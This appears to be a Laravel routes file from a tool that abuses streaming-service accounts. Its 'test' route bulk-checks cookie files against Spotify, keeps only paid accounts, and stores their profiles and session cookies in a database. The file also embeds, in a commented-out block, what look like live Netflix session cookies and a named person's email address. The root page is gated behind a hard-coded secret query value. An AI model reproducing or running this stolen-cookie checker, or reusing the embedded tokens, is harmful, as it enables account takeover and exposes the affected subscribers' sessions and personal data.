<?php

use App\Models\CookieRecord;
use App\Models\SpotifyAccount;
use App\Services\Loader;
use App\Services\Netflix;
use App\Services\Shahid;
use App\Services\Spotify;
use App\Services\SpotifyWeb;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;

Route::get('/', function () {
    if (request("pa") == "sayed") {
        // CookieRecord::create([
        //     "content" => ".netflix.com	TRUE	/	FALSE	1698429109	netflix-sans-normal-3-loaded	true
        //     .netflix.com	TRUE	/	TRUE	1722189109	SecureNetflixId	v%3D2%26mac%3DAQEAEQABABTgxRkzUA36mwD7U2nufhTrNEDKTR8F-2U.%26dt%3D1690653112314
        //     .netflix.com	TRUE	/	TRUE	1722189109	NetflixId	ct%3DBQAOAAEBEFFD1Jvmp2jytOf0G3anlMSCUF_4X5nuuFQ9DCSGFrxh-FHa44fmvlq6ywC9jU2j0gS7izjf8EihijVy_whtZ0xW9R2Nk4c2xhlTwYQLJ8_FvkPCdzkiszDsswG5eRzuE8XNFblLaqI7ZVys7tVFvQAMrgRXBtBEjuw1n5XSPoU9UYi4dd8_uOFi6yqAsEVmsvjW26G10_LF_GRGvzK9zvKRTrRdCmKIST-j_qVludaQz0iP8-KzniEZ12n8KmDf8c-ckDPAuU1SrGLpYekv5OzY8K_flg0e4MJ_6Z8HdRadAQ9jNBgTxy2yLuiK0Fu82eRsiBqrpB2PcEzJZwggPylg3IipfW4sDRepw1zGRPzlA2ygSYjxnWGatMmdORRTTj_SEy1VLQ-tIfNeXt1894HUGrq-aDqTUazvC8b7d5xvAT5FoSwy0hg-FkcwNxG3o9_TyEMdY6hCieOLs3ihr31-8IhRigh5Y9ky1FqvXlPCNkO7F6LniRS_a8KpvPI5HjmzwoiVXQj9DWQvr9JAvlZg9jxJPATzCv1XYhde9O9z8N8RDMIoy0YaZyuTe1bVxzyyNO1b7_PFrOW3AlYODz_HqaU_eQih_-FH2zB61UVimdovClLchVc9E-LOsH04t6MbK93HQYdfgDQmaVdlLj5Yw4BQrVKbDiS1oA0JOVwU44ZMc6IzbKdrMdqyryeCzT8ENeBbKBwvgj4IrtJkAkuAPn6acIzMgw2GyQRd1tV_kr6eJzSUy0D_nO3k3hdzGK2yyVO7znzBLKWH7SRALbUsWczrpW5j0ZGhw8QDO8AtHUI.%26bt%3Ddbl%26ch%3DAQEAEAABABTdNIqTQfUuKqZGgV7eHhIFrpqMMw-Ap-Y.%26v%3D2%26mac%3DAQEAEAABABTQwdhY1HpRMMD4ImsZa-eGo3gDainAuNA.
        //     .netflix.com	TRUE	/	FALSE	1722189112	OptanonConsent	isGpcEnabled=0&datestamp=Sat+Jul+29+2023+20%3A51%3A52+GMT%2B0300+(Eastern+European+Summer+Time)&version=202301.1.0&isIABGlobal=false&hosts=&consentId=95b6d940-db51-4fee-95b6-7064e73d43e4&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false
        //     .netflix.com	TRUE	/	FALSE	1690663909	flwssn	7df82f7e-4a76-4dee-9c9c-7e01d466231e
        //     .netflix.com	TRUE	/	FALSE	1690739522	memclid	1ad3618e-6e91-4e7e-b826-a3f2b0457896
        //     .netflix.com	TRUE	/	FALSE	1698429109	netflix-sans-bold-3-loaded	true
        //     .netflix.com	TRUE	/	FALSE	1690739522	nfvdid	BQFmAAEBEFBfEHLfjoUs9__592y9tAFgQcg2ZPQ1yWv_3MOQ3-BgCFW4rwO-x1dL-R6uKy7mk6eXbTY1qbz3B4VwhrmWUM2OVtSQzJ-mQVLDDJJfafZ31NUSHmq1IpWIoJHRQikWHZshWe-6ntKuoKXPsy-c1gUb",
        //     "email" => "yesenia.garcia@live.cl",
        //     "is_active" => true,
        // ]);
        return view("index");
    }
});

Route::get('test', function () {
    $folder = storage_path('app/cookies');
    $files = glob($folder . '/*.txt');
    $valid = [];
    $invalid = 0;
    foreach ($files as $file) {
        $cookie = file_get_contents($file);
        $spotify = new SpotifyWeb();
        if ($spotify->login($cookie)) {
            $profile = $spotify->profile;
            $subscription = $spotify->subscription;
            $plan = $subscription['currentPlan'];

            if ($plan == "free") continue;

            $email = $profile['email'] ?? $profile['username'];

            SpotifyAccount::updateOrCreate([
                "email" => $email
            ], [
                "profile" => $profile,
                "subscription" => $subscription,
                "cookies" => $cookie
            ]);

            // // save them local storage
            // $file = "spotify/Valid/" . $email . "-" . $plan . ".txt";

            // $cookies = $spotify->loadCookies($cookie, true);
            // $cookies = stripcslashes($cookies);

            // Storage::put($file, $cookies);

            // $file = "spotify/Valid/" . $email . "-" . $plan . ".json";

            // Storage::put($file, json_encode([
            //     "profile" => $profile,
            //     "subscription" => $subscription
            // ] , JSON_PRETTY_PRINT));

            $valid[] = $email;
        } else {
            $invalid++;
        }
    }


    return response()->json([
        "valid" => $valid,
        "invalid" => $invalid
    ]);
});

Route::get('test2', function () {
    $credentials = request()->only(["phone", "password"]);

    if (!auth()->attempt($credentials)) {
        return response()->json([
            "success" => false,
            "message" => "Invalid Credentials"
        ]);
    }

    $token = auth()->user()->createToken("auth_token")->plainTextToken;

    return response()->json([
        "success" => true,
        "token" => $token
    ]);
});
